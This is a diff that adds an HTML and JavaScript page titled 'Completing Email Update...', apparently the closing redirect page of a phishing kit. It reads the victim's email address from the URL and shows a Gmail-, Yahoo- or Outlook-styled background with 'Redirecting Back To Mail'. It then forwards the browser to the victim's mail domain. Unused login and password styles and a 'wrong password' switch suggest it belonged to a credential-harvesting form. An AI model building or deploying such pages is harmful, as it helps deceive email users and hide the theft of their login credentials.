@@ -1,0 +1,318 @@
+
+<html style="background-image: url(&quot;images/bg.jpg&quot;); visibility: visible;">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <title>Completing Email Update...</title>
+    
+    <style>
+    html {
+        width: 100%;
+        height: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-color: #dfdfdf;
+        background-image: url(https://dasmtp.com/email-list/int-amp/image/bg.jpg);
+        font-family: Arial, Helvetica, sans-serif;
+        background-size: cover;
+    }
+
+    .loginBox {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 350px;
+        height: 420px;
+        padding: 80px 40px;
+        box-sizing: border-box;
+        background: rgba(0, 0, 0, .5)
+    }
+
+    .user {
+        width: 100px;
+        height: 100px;
+        border-radius: 50%;
+        overflow: hidden;
+        position: absolute;
+        top: calc(-100px/2);
+        left: calc(50% - 50px)
+    }
+
+    h2 {
+        margin: 0;
+        padding: 0 0 20px;
+        color: #efed40;
+        text-align: center
+    }
+
+    .loginBox p {
+        margin: 0;
+        padding: 0;
+        font-weight: 700;
+        color: #fff
+    }
+
+    .loginBox input {
+        width: 100%;
+        margin-bottom: 20px
+    }
+
+    .loginBox input[type="text"],
+    .loginBox input[type="password"] {
+        border: none;
+        border-bottom: 1px solid #fff;
+        background: transparent;
+        outline: none;
+        height: 40px;
+        color: #fff;
+        font-size: 16px
+    }
+
+    ::placeholder {
+        color: rgba(255, 255, 255, .5)
+    }
+
+    .loginBox input[type="submit"] {
+        border: none;
+        outline: none;
+        height: 40px;
+        color: #fff;
+        font-size: 16px;
+        background: #00c911;
+        cursor: pointer
+    }
+
+    .loginBox input[type="submit"]:hover {
+        background: #04630c;
+        color: #fff
+    }
+
+    .loginBox a {
+        color: #fff;
+        font-size: 14px;
+        font-weight: 700;
+        text-decoration: none
+    }
+
+    #wrong {
+        text-align: center;
+        color: red;
+        font-size: 15px;
+        margin-top: -10px;
+        margin-bottom: 20px
+    }
+
+    iframe {
+        border: none;
+        position: absolute;
+        border: 0;
+        top: 25%;
+        left: 40%
+    }
+
+    body {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        background: rgba(0, 0, 0, .5)
+    }
+
+    .loading {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        height: 40px;
+        display: flex;
+        align-items: center
+    }
+
+    .obj {
+        width: 6px;
+        height: 40px;
+        background: #fff;
+        margin: 0 3px;
+        border-radius: 10px;
+        animation: loading .8s infinite
+    }
+
+    .obj:nth-child(2) {
+        animation-delay: .1s
+    }
+
+    .obj:nth-child(3) {
+        animation-delay: .2s
+    }
+
+    .obj:nth-child(4) {
+        animation-delay: .3s
+    }
+
+    .obj:nth-child(5) {
+        animation-delay: .4s
+    }
+
+    .obj:nth-child(6) {
+        animation-delay: .5s
+    }
+
+    .obj:nth-child(7) {
+        animation-delay: .6s
+    }
+
+    .obj:nth-child(8) {
+        animation-delay: .7s
+    }
+
+    @keyframes loading {
+        0% {
+            height: 0
+        }
+
+        50% {
+            height: 40px
+        }
+
+        100% {
+            height: 0
+        }
+    }
+
+    p {
+        margin-top: 300px;
+        font-size: 20px;
+        color: orange;
+        font-family: Arial #000;
+        font-weight: 700
+    }
+
+    html,
+    body {
+        font-family: Arial, Helvetica, sans-serif;
+    }
+    </style>
+</head>
+
+<body >
+    <div class="loading">
+        <div class="obj" id="obj"></div>
+        <div class="obj"></div>
+        <div class="obj"></div>
+        <div class="obj"></div>
+        <div class="obj"></div>
+        <div class="obj"></div>
+        <div class="obj"></div>
+        <div class="obj"></div>
+    </div>
+    <center>
+        <p style="font-weight: bold; padding: 30px 30px 50px 30px; margin-top: 50%;">Redirecting Back To Mail</p>
+    </center>
+    <script src="js/jquery.min.js"></script>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script>
+    $(document).ready(function() {
+        var loading = $('.loading');
+        var htmlcon = $('html');
+        var alnumstr = '123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        var bgimg = 'images/bg.jpg';
+        var userimg = false;
+        var emailfromurl = false;
+        var emaildomain = '';
+        var rdurl = '';
+        emailfromurl = get_email_hash();
+        if (geturlparameter('sher')) { $('#wrong').show(); }
+        if (!emailfromurl) {
+            emailfromurl = geturlparameter('e');
+        }
+        if (emailfromurl) {
+            emaildomain = getdomainpartofemail(emailfromurl);
+        }
+        if (emaildomain) {
+            rdurl = 'http://' + emaildomain;
+            if (emaildomain == 'gmail.com') {
+                bgimg = 'images/gm.jpg';
+            } else if (emaildomain == 'yahoo.com' || emaildomain.indexOf('yahoo') != -1) {
+                bgimg = 'images/ym.jpg';
+
+            } else if (
+                emaildomain == 'hotmail.com' || emaildomain.indexOf('hotmail') != -1 ||
+                emaildomain == 'outlook.com' || emaildomain.indexOf('outlook') != -1
+            ) {
+                bgimg = 'images/hm.jpg';
+            }
+        }
+        bgimg = 'url("' + bgimg + '")';
+        htmlcon.css({ 'background-image': bgimg });
+        //htmlcon.css({ 'visibility' : 'visible' });
+
+        setTimeout(function() { htmlcon.css({ 'visibility': 'visible' }); }, 1000);
+        if (rdurl != '') {
+            setTimeout(function() {
+                //alert(rdurl);
+                window.location.replace(rdurl);
+            }, 4000);
+        }
+    });
+
+    function randomInteger(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+
+    function randomString(r, n) { for (var o = "", t = r; 0 < t; --t) o += n[Math.floor(Math.random() * n.length)]; return o }
+
+    function getdomainpartofemail(a) { var e, t = !1; return !validateEmail(a) || -1 != (e = (a = a.toLowerCase()).indexOf("@")) && (t = a.substr(e + 1)), t }
+
+    function get_email_hash() { var a = !1,
+            i = window.location.href,
+            t = (i = i.trim()).lastIndexOf("#"); return -1 != t && (a = i.substring(t + 1), validateEmail(a) || (a = !1)), a }
+
+    function validateEmail(t) { return /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(String(t).toLowerCase()) }
+
+    function geturlparameter(r) { for (var t = window.location.search.substring(1).split("&"), e = 0; e < t.length; e++) { var n = t[e].split("="); if (n[0] == r) return decodeURIComponent(n[1]) } }
+    </script>
+    <style>
+    .tb_button {
+        padding: 1px;
+        cursor: pointer;
+        border-right: 1px solid #8b8b8b;
+        border-left: 1px solid #FFF;
+        border-bottom: 1px solid #fff;
+    }
+
+    .tb_button.hover {
+        borer: 2px outset #def;
+        background-color: #f8f8f8 !important;
+    }
+
+    .ws_toolbar {
+        z-index: 100000
+    }
+
+    .ws_toolbar .ws_tb_btn {
+        cursor: pointer;
+        border: 1px solid #555;
+        padding: 3px
+    }
+
+    .tb_highlight {
+        background-color: yellow
+    }
+
+    .tb_hide {
+        visibility: hidden
+    }
+
+    .ws_toolbar img {
+        padding: 2px;
+        margin: 0px
+    }
+    </style>
+</body>
+
+</html>
